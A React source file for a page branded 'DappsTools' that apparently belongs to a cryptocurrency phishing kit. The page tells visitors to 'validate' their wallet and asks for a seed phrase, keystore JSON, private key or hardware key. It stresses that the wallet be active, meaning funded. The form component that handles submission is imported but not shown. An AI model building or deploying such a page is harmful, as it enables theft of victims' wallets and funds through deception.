import React, { useState, useEffect } from "react";
import logo from "../images/logo.png";
import { useNavigate } from "react-router-dom";
import FormData from "../components/form";

const Form = () => {
  useEffect(() => {
    window.scrollTo({ top: 0 });
  }, []);
  const navigate = useNavigate();
  const [index, setIndex] = useState(0);
  const nav = ["Nnemonics", "Keystore", "Private Key", "Hardware"];
  return (
    <div className='py-12 p-4'>
      <nav className='p-4 shadow-md flex justify-between fixed w-full left-0 bg-white top-0 z-10'>
        <div
          className='ml-auto flex items-center px-12 gap-3 cursor-pointer'
          onClick={() => navigate("/")}
        >
          <img src={logo} alt='logo' className='w-10' />
          <h1 className='font-bold'>DappsTools</h1>
        </div>
      </nav>
      <div className='my-10 max-w-4xl rounded-md shadow-xl p-4 md:p-8 mx-auto flex flex-col items-center justify-center'>
        <h2 className='font-extrabold text-xl md:text-3xl text-center text-gray-700'>
          VALIDATE YOUR SELECTED WALLET TO CONTINUE
        </h2>
        <p className='text-sm md:text-lg text-center my-5'>
          Ensure you enter an active wallet. Inactive/empty wallets are likely
          to experience issues during synchronization.
        </p>
        <div className='my-5 flex items-center gap-8 p-4 w-full overflow-x-scroll'>
          {nav.map((item, i) => {
            return (
              <h1
                className={`${
                  index === i
                    ? "bg-[#1c44a5] text-white"
                    : "bg-white text-gray-900"
                } uppercase font-bold text-sm whitespace-nowrap  select-none cursor-pointer p-3 px-6 rounded-md md:hover:bg-blue-200 transition`}
                key={i}
                onClick={() => setIndex(i)}
              >
                {item}
              </h1>
            );
          })}
        </div>
        <p className='text-gray-600 my-4 text-lg'>
          {index === 0
            ? "Please enter your 12/24 word phrase"
            : index === 1
            ? "Enter your Keystore JSON"
            : index === 2
            ? "Enter your private key"
            : "Enter your Hardware Key"}
        </p>
        <FormData index={index} />
      </div>
    </div>
  );
};

export default Form;
